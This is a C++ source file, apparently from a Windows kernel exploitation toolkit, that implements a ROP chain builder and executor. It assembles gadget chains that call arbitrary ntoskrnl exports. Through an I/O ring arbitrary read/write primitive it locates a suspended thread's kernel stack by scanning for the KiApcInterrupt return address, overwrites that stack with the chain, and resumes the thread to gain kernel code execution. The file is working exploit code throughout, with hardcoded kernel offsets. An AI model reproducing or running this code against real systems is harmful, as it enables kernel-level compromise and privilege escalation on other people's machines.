#include "rop.h"

#include <vector>
#include <stdint.h>
#include <string>

#include <spdlog/spdlog.h>

#include "kernel.hpp"

namespace collat::rop {

    void dummy() {
        while(1) {}
    }
    
    RopChain::RopChain() {
        auto start_routine = reinterpret_cast<LPTHREAD_START_ROUTINE>(dummy);
        this->_thread = CreateThread(
            nullptr,
            0,
            start_routine,
            nullptr,
            CREATE_SUSPENDED,
            nullptr
        );
        
        this->_completion_event = CreateEvent(nullptr, FALSE, TRUE, TEXT("CompletionEvent"));
    }

    RopChain::~RopChain() {
        spdlog::debug("Disposing ROP builder");
        CloseHandle(this->_thread);
        CloseHandle(this->_completion_event);
    }

    RopChain& RopChain::gadget(std::string gadget) {
        this->_stack.push_back(kernel::get_gadget(gadget));
        this->_chain_string.push_back(gadget);
        return *this;
    }

    RopChain& RopChain::check_and_align() {
        if(!(this->_stack.size() % 2)) {
            this->_stack.push_back(kernel::get_gadget("ret"));
            this->_chain_string.push_back("ret (for alignment)");
        }

        return *this;
    }

    template <typename T>
    RopChain& RopChain::value(T value) {
        this->_stack.push_back(
            (uint64_t)value
        );
        this->_chain_string.push_back(std::format("{}", value));
        return *this;
    }

    // todo: error checking on builder, also find more stack pivot gadgets, e.g: just for the shadow region
    RopChain& RopChain::call(std::string module, std::string name, std::vector<uint64_t> arguments, uint64_t* return_output) {
        auto routine = kmodule::get_export(module, name);
        this->_chain_string.push_back(std::format("// CALL: {}.{}({})", module, name, arguments));
        return this->call(routine, arguments, return_output);
    }

    template <typename T>
    RopChain& RopChain::call(T pointer, std::vector<uint64_t> arguments, uint64_t* return_output) {

        #define ALIGN_STACK() if(!(this->_stack.size() % 2)) { STACK_COMMENT("Stack alignment"); PUSH(kernel::get_gadget("ret")); }
        #define PUSH(x) this->_stack.push_back(x); \
            this->_chain_string.push_back(#x);
        #define STACK_COMMENT(c) this->_chain_string.push_back("// " c);

        this->_chain_string.push_back(std::format("// CALL ADDRESS: 0x{:x}", (uint64_t)pointer));

        size_t nargs = arguments.size();
        spdlog::debug("number of arguments in call: {}", nargs);

        // Put first four arguments onto the stack
        if (nargs > 0) {
            PUSH(kernel::get_gadget("pop rcx; ret"));
            PUSH(arguments.at(0));
        }

        if (nargs > 1) {
            PUSH(kernel::get_gadget("pop rdx; ret"));
            PUSH(arguments.at(1));
        }

        if (nargs > 2) {
            PUSH(kernel::get_gadget("pop r8; ret"));
            PUSH(arguments.at(2));
        }

        if (nargs > 3) {
            PUSH(kernel::get_gadget("pop r9; ret"));
            PUSH(arguments.at(3));
        }


        
        ALIGN_STACK()

        // Call function
        STACK_COMMENT("Call function");
        PUSH(kernel::get_gadget("pop rax; ret"));
        PUSH(reinterpret_cast<uint64_t>(pointer));
        PUSH(kernel::get_gadget("jmp rax"));

        // Pivot the stack
        STACK_COMMENT("Stack pivot");
        PUSH(kernel::get_gadget("add rsp, 0x78; ret"));

        int used_space = 0;
        if (nargs > 4) {
            // Populate 0x20 byte shadow region with padding
            STACK_COMMENT("Shadow space");
            for (int i = 0; i < 4; i++) {
                PUSH(kernel::get_gadget("ret"));
                used_space++;
            }

            // Put four and up onto the stack
            for (int i = 4; i < nargs; i++) {
                STACK_COMMENT("Stack argument");
                PUSH(arguments.at(i));
                used_space++;
            }
        }

        // Pad our unused stack arguments
        STACK_COMMENT("Argument padding");
        for (int i = 0; i < ((0x78 / 8) - used_space); i++) {
            _stack.push_back(kernel::get_gadget("ret"));
        }

        // Pass the return value back to user-mode
        if(return_output != nullptr) {
            STACK_COMMENT("Return value");
            _stack.push_back(kernel::get_gadget("pop rcx; ret"));
            _stack.push_back(reinterpret_cast<uint64_t>(
                return_output
            ));
            _stack.push_back(kernel::get_gadget("mov [rcx], rax; ret"));
        }

        return *this;
    }

    std::vector<uint64_t> RopChain::finalize() {
        /// @todo: completion event signalling and termination
        auto terminate_thread_ptr = reinterpret_cast<uint64_t>(kmodule::get_base("ntoskrnl.exe")) + 0x444100;

        return this->gadget("pop rcx; ret") // Signal completion event
            .value(this->_completion_event)
            .gadget("pop rdx; ret")
            .value(0)
            .gadget("pop rax; ret")
            .value(kmodule::get_export("ntoskrnl.exe", "ZwSetEvent"))
            .check_and_align()
            .gadget("jmp rax")
            .gadget("pop rcx; ret") // Terminate Thread
            .value(this->_thread)
            .gadget("pop rdx; ret")
            .value(STATUS_SUCCESS)
            .gadget("pop rax; ret")
            .value(terminate_thread_ptr)
            .check_and_align()
            .gadget("jmp rax")
            ._stack;
    }

    std::vector<std::string> RopChain::get_chain_string() {
        return this->_chain_string;
    }

    /// @todo: Consider stack limits to fail the function if chain exceeds limits
    bool RopChain::execute(int timeout, bool log_stack) {
        auto ioring = kernel::get_ioring();
        auto thread_ptr = collat::get_object<uint64_t>(
            GetCurrentProcessId(),
            this->_thread
        );

        auto stack_base = ioring->raw_read<uint64_t>(reinterpret_cast<void*>(thread_ptr + 0x38));

        auto kernel_base = reinterpret_cast<uint64_t>(collat::kmodule::get_base("ntoskrnl.exe"));
        auto dispatch_apc_interrupt_ptr = kernel_base + 0x447db6;

        auto rop_chain = this->finalize();

        uint64_t return_address = 0;
        for(int i = 0x8; i < 0x7000; i += 0x8) {
            auto stack_ptr = reinterpret_cast<void*>(stack_base - i);
            auto value = ioring->raw_read<uint64_t>(stack_ptr);
            if((value & 0xfffff00000000000) == 0xfffff00000000000 && value == dispatch_apc_interrupt_ptr) {
                return_address = stack_base - i;
                break;
            }
        }

        if(return_address == 0) {
            spdlog::error("failed to execute rop chain, could not KiApcInterrupt in stack");
            return false;
        }

        if(log_stack) {
            spdlog::debug("executing rop chain:");
            for(auto value : rop_chain) {
                spdlog::debug("{:x}", value);
            }
        }

        // Write the ROP chain value-by-value to avoid any potential IORing writing issues :P
        int offset = 0;
        for(auto value : rop_chain) {
            auto stack_ptr = return_address + offset;
            ioring->write64<uint64_t>(stack_ptr, value);
            offset += 8;
        }

        // Resume the thread to execute the ROP chain
        ResumeThread(this->_thread);

        // Wait for our completion event to be signalled
        auto reason = WaitForSingleObject(this->_completion_event, timeout);
        if(reason == WAIT_TIMEOUT) {
            return false;
        }

        return true;
    }

    
}